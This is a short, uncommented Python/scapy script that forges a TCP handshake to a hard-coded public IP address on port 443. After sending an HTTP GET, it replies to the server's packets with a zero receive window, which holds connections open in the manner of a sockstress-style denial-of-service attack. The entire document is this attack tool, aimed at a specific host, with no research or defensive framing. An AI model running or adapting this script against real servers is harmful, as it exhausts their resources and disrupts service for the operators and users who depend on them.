#!/usr/bin/python
from scapy.all import *


def handle_packet(packet):
  response=IP(dst=packet[IP].src,src=packet[IP].dst)/TCP(window=5, sport=packet[TCP].dport, dport=packet[TCP].sport)
  payload="GET / HTTP/1.0\r\n\r\n"
  respond = False
  if(packet[TCP].flags == 0x12):
    response[TCP].seq = sequence + 1
    response[TCP].ack = packet[TCP].seq+1
    response[TCP].flags = "A"
    response = response / Raw(load=payload)
    respond = True
  if(packet[TCP].flags == 0x10 or packet[TCP].flags == 0x18):
    response[TCP].seq = sequence + 1 + len(payload)
    response[TCP].ack = packet[TCP].seq
    response[TCP].window=0
    response[TCP].flags = "A"
    respond = True
  if respond:
    send(response)


target = "204.51.94.202"
target_port = 443
source = "192.168.56.130"
sequence = 101010

ip=IP(dst=target, src=source)
tcp=TCP(flags="S", sport=2000, dport=target_port, seq=sequence)
#wrpcap("/tmp/packet.pcap",Ether()/ip/tcp)
send(ip/tcp)

sniff(filter="tcp and dst host 192.168.56.130", prn=handle_packet)
